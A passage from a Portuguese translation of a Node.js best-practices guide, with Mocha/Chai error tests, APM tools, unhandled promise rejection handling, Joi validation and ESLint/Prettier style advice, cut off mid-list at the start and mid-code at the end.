<li>Permite múltiplos fluxos de destino configuráveis. Por exemplo, você pode estar gravando logs de rastreio em um arquivo, mas quando um erro é encontrado, grava no mesmo arquivo, depois no arquivo de erro e envia um email ao mesmo tempo…</li>
</ol>
<h2>2.8 Fluxos de testes de erros usando seu framework favorito</h2>
<p><strong>TL;DR:</strong> Se o analista de QA ou o desenvolvedor de testes - Certifique-se de que seu código não atenda apenas o cenário positivo, mas também trate e retorne os erros corretos. Frameworks de teste como Mocha e Chai podem lidar com isso facilmente (veja exemplos de códigos no “Gist popup”)</p>
<p><strong>Caso contrário:</strong> Sem testes, seja automático ou manual, não podemos confiar em nosso código para retornar os erros certos. Sem erros significantes, não há tratamento de erros.</p>
<h1>Fluxos de testes de erros usando seu framework favorito</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Testar caminhos “felizes” não é melhor do que testar falhas. Uma boa cobertura de código de teste exige testar caminhos excepcionais. Caso contrário, não há confiança de que as exceções sejam realmente tratadas corretamente. Cada estrutura de testes unitários, como o <a href="https://mochajs.org/" target="_blank" rel="nofollow noopener noreferrer">Mocha</a> e <a href="http://chaijs.com/" target="_blank" rel="nofollow noopener noreferrer">Chai</a>, suporta testes de exceção (exemplos de código abaixo). Se você achar tedioso testar todas as funções internas e exceções, você pode resolver testando apenas erros HTTP da API REST.</p>
<h3>Exemplo de código: garantindo que a exceção correta seja lançada usando Mocha &#x26; Chai</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token function">describe</span><span class="token punctuation">(</span><span class="token string">"Bate-papo do Facebook"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"Notifica em nova mensagem de bate-papo"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> chatService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">chatService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chatService<span class="token punctuation">.</span>participants <span class="token operator">=</span> <span class="token function">getDisconnectedParticipants</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">expect</span><span class="token punctuation">(</span>chatService<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> <span class="token string">"Oi"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">throw</span><span class="token punctuation">(</span>ConnectionError<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo de código: garantindo que a API retorne o código de erro HTTP correto</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"Cria um novo grupo no Facebook"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">done</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> invalidGroupInfo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token function">httpRequest</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
    uri<span class="token operator">:</span> <span class="token string">"facebook.com/api/groups"</span><span class="token punctuation">,</span>
    resolveWithFullResponse<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    body<span class="token operator">:</span> invalidGroupInfo<span class="token punctuation">,</span>
    json<span class="token operator">:</span> <span class="token boolean">true</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token comment">// se fôssemos executar o código neste bloco, nenhum erro foi lançado na operação acima</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">equal</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>statusCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>2.9 Descubra erros e downtime usando APM</h2>
<p><strong>TL;DR:</strong> Produtos de monitoramento e desempenho (também conhecido como APM), avaliam sua base de código ou API de forma proativa, para que possam destacar automaticamente erros, falhas e lentidões não percebidos.</p>
<p><strong>Caso contrário:</strong> Você pode gastar muito esforço medindo o desempenho e os tempos de inatividade (downtime) da API. Provavelmente, você nunca saberá quais são suas partes de código mais lentas no cenário real e como elas afetam o UX.</p>
<h1>Descubra erros e downtime usando APM</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Exceção != Erro. O tratamento de erros tradicional pressupõe a existência de Exceção, mas os erros de aplicativo podem vir na forma de caminhos de código lento, tempo de inatividade (downtime) da API, falta de recursos computacionais e muito mais. É aqui que os produtos APM são úteis, pois permitem detectar uma ampla variedade de problemas “enterrados” de forma proativa e com uma configuração mínima. Entre os recursos comuns dos produtos APM estão, por exemplo, alertas quando a API HTTP retorna erros, detecta quando o tempo de resposta da API cai abaixo de um limite, detecção de ‘códigos suspeitos’, formas de monitorar recursos do servidor, painel de inteligência operacional com métricas de TI e muitos outros recursos úteis. A maioria dos fornecedores oferece um plano gratuito.</p>
<h3>Wikipédia sobre APM</h3>
<p>Nos campos de tecnologia da informação e gerenciamento de sistemas, o Application Performance Management (APM) é o monitoramento e gerenciamento de desempenho e disponibilidade de aplicativos de software. O APM se esforça para detectar e diagnosticar problemas complexos de desempenho do aplicativo para manter um nível esperado de serviço. APM é “a tradução de métricas de TI em significado de negócios ([i.e.] value)“. Principais produtos e segmentos.</p>
<h3>Entendendo o mercado de APM</h3>
<p>Os produtos APM constituem 3 segmentos principais:</p>
<ol>
<li>Monitoramento de sites ou APIs - serviços externos que monitoram constantemente o tempo de atividade e o desempenho por meio de solicitações HTTP. Pode ser configurado em poucos minutos. A seguir estão alguns candidatos selecionados: <a href="https://www.pingdom.com/" target="_blank" rel="nofollow noopener noreferrer">Pingdom</a>, <a href="https://uptimerobot.com/" target="_blank" rel="nofollow noopener noreferrer">Uptime Robot</a> e <a href="https://newrelic.com" target="_blank" rel="nofollow noopener noreferrer">New Relic</a> / monitoramento de aplicativos)</li>
<li>Instrumentação de código - família de produtos que exige a incorporação de um agente no aplicativo para usar recursos como detecção de código lento, estatísticas de exceção, monitoramento de desempenho e muito mais. A seguir estão alguns candidatos selecionados: New Relic, App Dynamics.</li>
<li>Painel de inteligência operacional - essa linha de produtos está focada em auxiliar a equipe de operações com métricas e conteúdo de curadoria que ajuda a ficar facilmente a par do desempenho do aplicativo. Isso geralmente envolve a agregação de várias fontes de informações (logs de aplicativos, logs do BD, log de servidores, etc.) e o trabalho de design do painel inicial. A seguir estão alguns candidatos selecionados: <a href="https://www.datadoghq.com/" target="_blank" rel="nofollow noopener noreferrer">Datadog</a>, <a href="https://www.splunk.com/" target="_blank" rel="nofollow noopener noreferrer">Splunk</a>, <a href="https:%20//www.zabbix.%20com%20/" target="_blank" rel="nofollow noopener noreferrer">Zabbix</a>.</li>
</ol>
<h3>Exemplo: UpTimeRobot.Com - Painel de monitoramento de site</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/uptimerobot.jpg?raw=true" alt="alt text" title="Painel de monitoramento de sites"></p>
<h3>Example: AppDynamics.Com – monitoramento de ponta a ponta combinado com instrumentação de código</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/app-dynamics-dashboard.png?raw=true" alt="alt text" title="monitoramento de ponta a ponta combinado com instrumentação de código"></p>
<h2>2.10 Capture rejeições de promises não tratadas</h2>
<p><strong>TL;DR:</strong> Qualquer exceção lançada dentro de uma promise será descartada, a menos que o desenvolvedor não se esqueça de tratá-la explicitamente. Mesmo que seu código esteja inscrito no process.uncaughtException! Supere isso, registrando no evento process.unhandledRejection.</p>
<p><strong>Caso contrário:</strong> Seus erros serão engolidos e não vão deixar rastros. Nada para se preocupar.</p>
<h1>Capture rejeições de promises não tratadas</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Normalmente, a maioria do código de um aplicativo Node.js/Express moderno é executado dentro de promises - seja no manipulador .then, em uma função callback ou em um bloco catch. Surpreendentemente, a menos que um desenvolvedor tenha lembrado de adicionar uma cláusula .catch, os erros lançados nesses locais não serão manipulados pelo manipulador de eventos uncaughtException e desaparecerão. Versões recentes do Node adicionaram uma mensagem de aviso quando uma rejeição não tratada aparece, embora isso possa ajudar a perceber quando as coisas dão errado, obviamente não é um método adequado de tratamento de erros. A solução direta é nunca esquecer de incluir cláusulas .catch em cada chamada de cadeia de promessa e redirecionar para um manipulador de erro centralizado. No entanto, criar sua estratégia de tratamento de erros apenas contando com a disciplina do desenvolvedor é um pouco frágil. Conseqüentemente, é altamente recomendado usar uma alternativa elegante e usar o <code class="language-text">process.on (&#39;unhandledRejection&#39;, callback)</code> - isso garantirá que qualquer erro prometido, se não for tratado localmente, receba seu tratamento.</p>
<h3>Exemplo de código: esses erros não serão detectados por nenhum manipulador de erros (exceto unhandledRejection)</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token constant">DAL</span><span class="token punctuation">.</span><span class="token function">getUserById</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">johnSnow</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token comment">// esse erro vai simplesmente desaparecer</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>johnSnow<span class="token punctuation">.</span>isAlive <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'ahhhh'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo de código: captura de promises não resolvidas e rejeitadas</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript">process<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'unhandledRejection'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">reason<span class="token punctuation">,</span> p</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token comment">// Acabei de receber uma rejeição de promise não tratada, já que nós já temos uma alternativa para erros não manipulados (veja abaixo), vamos jogar e deixar ele lidar com isso</span>
  <span class="token keyword">throw</span> reason<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
process<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'uncaughtException'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token comment">// Acabei de receber um erro que nunca foi tratado, tempo para resolvê-lo e, em seguida, decidir se é necessário reiniciar</span>
  errorManagement<span class="token punctuation">.</span>handler<span class="token punctuation">.</span><span class="token function">handleError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>errorManagement<span class="token punctuation">.</span>handler<span class="token punctuation">.</span><span class="token function">isTrustedError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span>
    process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Citação de Blog: “Se você pode cometer um erro, em algum momento você vai”</h3>
<p> Do blog James Nelson</p>
<blockquote>
<p>Vamos testar sua compreensão. Qual das seguintes opções você espera que imprima um erro no console?</p>
</blockquote>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript">Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>‘promised value’<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>‘error’<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>‘error value’<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>‘error’<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>‘error’<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<blockquote>
<p>Eu não sei sobre você, mas minha resposta é que eu esperaria que todos eles imprimissem um erro. No entanto, a realidade é que vários ambientes JavaScript modernos não imprimem erros para nenhum deles. O problema de ser humano é que, se você puder cometer um erro, em algum momento você o fará. Tendo isso em mente, parece óbvio que devemos projetar as coisas de tal maneira que os erros causem o mínimo de dano possível, e isso significa manipular erros por padrão, não descartá-los.</p>
</blockquote>
<h2>2.11 Falhe rápido, valide argumentos usando uma biblioteca dedicada</h2>
<p><strong>TL;DR:</strong> Isto deveria fazer parte das melhores práticas de Express - Confirme a entrada da API para evitar erros desagradáveis ​​que são muito mais difíceis de acompanhar mais tarde. A validação de código geralmente é entediante ao menos que você esteja utilizando uma biblioteca de ajuda bem legal, como a Joi.</p>
<p><strong>Caso contrário:</strong> Considere isto: sua função espera receber um “Desconto” como argumento numérico que foi esquecido de passar. Mais adiante, seu código verifica se Desconto!=0 (valor do desconto permitido é maior que zero). Depois, irá permitir que o usuário desfrute de um desconto. Meu Deus, que baita bug. Entendeu?</p>
<h1>Falhe rápido, valide argumentos usando uma biblioteca dedicada</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Nós todos sabemos como verificar argumentos e falhar rapidamente é importante para evitar bugs ocultos (veja exemplo de código antipadrão abaixo). Se não, leia sobre programação explícita e programação defensiva. Na realidade, tendemos a evitá-lo devido ao incômodo de codificá-lo (por exemplo, pensar em validar o objeto JSON hierárquico com campos como e-mail e datas) - bibliotecas como o Joi e o Validator tornam esta tediosa tarefa muito fácil.</p>
<h3>Wikipédia: Programação Defensiva</h3>
<p>A programação defensiva é uma abordagem para melhorar o software e o código-fonte, em termos de qualidade geral - reduzindo o número de bugs e problemas de software. Tornando o código-fonte compreensível - o código-fonte deve ser legível e compreensível, de modo que seja aprovado em uma auditoria de código. Fazer com que o software se comporte de maneira previsível, apesar de entradas inesperadas ou ações do usuário.</p>
<h3>Exemplo de código: validando uma entrada JSON complexa usando “Joi”</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">var</span> memberSchema <span class="token operator">=</span> Joi<span class="token punctuation">.</span><span class="token function">object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
 password<span class="token operator">:</span> Joi<span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">regex</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[a-zA-Z0-9]{3,30}$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>
 birthyear<span class="token operator">:</span> Joi<span class="token punctuation">.</span><span class="token function">number</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">integer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token number">1900</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token number">2013</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
 email<span class="token operator">:</span> Joi<span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">email</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">addNewMember</span><span class="token punctuation">(</span><span class="token parameter">newMember</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token comment">// afirmações vêm em primeiro lugar</span>
 Joi<span class="token punctuation">.</span><span class="token function">assert</span><span class="token punctuation">(</span>newMember<span class="token punctuation">,</span> memberSchema<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//lança se a validação falhar</span>
 <span class="token comment">// outra lógica aqui</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Anti-padrão: nenhuma validação gera erros desagradáveis</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Se o desconto for positivo, vamos redirecionar o usuário para imprimir seus cupons de desconto</span>
<span class="token keyword">function</span> <span class="token function">redirectToPrintDiscount</span><span class="token punctuation">(</span><span class="token parameter">httpResponse<span class="token punctuation">,</span> member<span class="token punctuation">,</span> discount</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>discount <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        httpResponse<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/discountPrintView/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>member<span class="token punctuation">.</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">redirectToPrintDiscount</span><span class="token punctuation">(</span>httpResponse<span class="token punctuation">,</span> someMember<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// esqueci de passar o desconto de parâmetro, por que diabos o usuário foi redirecionado para a tela de desconto?</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Citação de Blog: “Você deve lançar esses erros imediatamente”</h3>
<p> Do blog: Joyent</p>
<blockquote>
<p>Um caso degenerado é quando alguém chama uma função assíncrona, mas não passa uma callback. Você deve lançar esses erros imediatamente, pois o programa está quebrado e a melhor chance de encontrar erros envolve obter pelo menos um rastreamento de stack e, idealmente, um arquivo principal no ponto do erro. Para fazer isso, recomendamos a validação dos tipos de todos os argumentos no início da função.</p>
</blockquote>
<h1><code class="language-text">3. Práticas de Estilo de Código</code></h1>
<h2>3.1 Use ESLint</h2>
<p><strong>TL;DR:</strong> O <a href="https://eslint.org" target="_blank" rel="nofollow noopener noreferrer">ESLint</a> é de fato o padrão para verificar possíveis erros e consertar o estilo de código, não apenas para identificar problemas básicos de espaçamento, mas também para detectar antipadrões de código, como desenvolvedores lançando erros sem classificação. Embora o ESLint possa corrigir automaticamente estilos de código, outra ferramentas como o <a href="https://www.npmjs.com/package/prettier" target="_blank" rel="nofollow noopener noreferrer">prettier</a> e o <a href="https://www.npmjs.com/package/js-beautify" target="_blank" rel="nofollow noopener noreferrer">beautify</a> são mais poderosos no quesito correção de formatação e trabalham em conjunto com o ESLint.</p>
<p><strong>Caso contrário:</strong> Desenvolvedores irão focar nas preocupações tediosas de espaçamento e largura de linha e o tempo poderá ser desperdiçado pensando sobre o estilo de código do projeto.</p>
<h1>Use ESLint e Prettier</h1>
<h3>Comparando ESLint com Prettier</h3>
<p>Se você formatar este código usando o ESLint, ele apenas dará um aviso de que ele é muito grande (dependendo da sua configuração <code class="language-text">max-len</code>). O Prettier irá formatá-lo automaticamente para você.</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token function">foo</span><span class="token punctuation">(</span><span class="token function">reallyLongArg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">omgSoManyParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">IShouldRefactorThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">isThereSeriouslyAnotherOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">noWayYouGottaBeKiddingMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token function">foo</span><span class="token punctuation">(</span>
  <span class="token function">reallyLongArg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token function">omgSoManyParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token function">IShouldRefactorThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token function">isThereSeriouslyAnotherOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token function">noWayYouGottaBeKiddingMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Fonte: <a href="https://github.com/prettier/prettier-eslint/issues/101" target="_blank" rel="nofollow noopener noreferrer">https://github.com/prettier/prettier-eslint/issues/101</a></p>
<h3>Integrando ESLint e Prettier</h3>
<p>ESLint e Prettier se sobrepõem no recurso de formatação de código, mas podem ser facilmente combinados usando outros pacotes como <a href="https://github.com/prettier/prettier-eslint" target="_blank" rel="nofollow noopener noreferrer">prettier-eslint</a>, <a href="https://github.com/prettier/eslint-plugin-prettier" target="_blank" rel="nofollow noopener noreferrer">eslint-plugin-prettier</a>, e <a href="https://github.com/prettier/eslint-config-prettier" target="_blank" rel="nofollow noopener noreferrer">eslint-config-prettier</a>. Para mais informações sobre as diferenças entre eles, clique <a href="https://stackoverflow.com/questions/44690308/whats-the-difference-between-prettier-eslint-eslint-plugin-prettier-and-eslint" target="_blank" rel="nofollow noopener noreferrer">aqui</a>.</p>
<h2>3.2 Plugins Específicos do Node.js</h2>
<p><strong>TL;DR:</strong> Além das regras padrões do ESLint que cobrem somente o Vanilla JS, adicione plug-ins específicos do Node, como o <a href="https://www.npmjs.com/package/eslint-plugin-node" target="_blank" rel="nofollow noopener noreferrer">eslint-plugin-node</a>, o <a href="https://www.npmjs.com/package/eslint-plugin-mocha" target="_blank" rel="nofollow noopener noreferrer">eslint-plugin-mocha</a> e o <a href="https://www.npmjs.com/package/eslint-plugin-security" target="_blank" rel="nofollow noopener noreferrer">eslint-plugin-node-security</a></p>
<p><strong>Caso contrário:</strong> Muitos padrões de código do Node.js com falha podem escapar do radar. Por exemplo, desenvolvedores podem chamar arquivos fazendo o require(variavelComoCaminho) com uma determinada variável como caminho, o que permite que invasores executem qualquer script JS. Os linters do Node.js podem detectar tais padrões e reclamar cedo.</p>
<h2>3.3 Comece um Bloco de Código com Chaves na Mesma Linha</h2>
<p><strong>TL;DR:</strong> As chaves que abrem um bloco de código devem estar na mesma linha da instrução de abertura</p>
<h3>Exemplo de Código</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Do</span>
<span class="token keyword">function</span> <span class="token function">someFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// code block</span>
<span class="token punctuation">}</span>

<span class="token comment">// Avoid</span>
<span class="token keyword">function</span> <span class="token function">someFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token comment">// code block</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><strong>Caso contrário:</strong> Evitar esta recomendação pode levar a resultados inesperados, como visto nesta thread do StackOverflow:</p>
<p>🔗 <a href="https://stackoverflow.com/questions/3641519/why-does-a-results-vary-based-on-curly-brace-placement" target="_blank" rel="nofollow noopener noreferrer"><strong>Leia Mais:</strong> “Por que os resultados variam com base no posicionamento da chave?” (Stackoverflow)</a></p>
<h2>3.4 Separe suas declarações corretamente</h2>
<p>Não importa se você usa ponto-e-vírgula ou não para separar suas declarações, conhecer as armadilhas comuns de quebras de linha impróprias ou inserção automática de ponto e vírgula, irá ajudá-lo a eliminar erros regulares de sintaxe.</p>
<p><strong>TL;DR:</strong> Use o ESLint para obter conhecimento sobre as preocupações de separação. <a href="https://prettier.io/" target="_blank" rel="nofollow noopener noreferrer">Prettier</a> ou <a href="https://standardjs.com/" target="_blank" rel="nofollow noopener noreferrer">Standardjs</a> podem resolver automaticamente esses problemas.</p>
<p><strong>Caso contrário:</strong> Como visto na seção anterior, o interpretador do JavaScript adiciona automaticamente um ponto-e-vírgula ao final de uma instrução, se não houver uma, ou considera uma instrução como não terminada onde deveria, o que pode levar a alguns resultados indesejáveis. Você pode usar atribuições e evitar o uso de expressões de função chamadas imediatas para evitar a maioria dos erros inesperados.</p>
<h3>Exemplo de Código</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Faça</span>
<span class="token keyword">function</span> <span class="token function">doThing</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
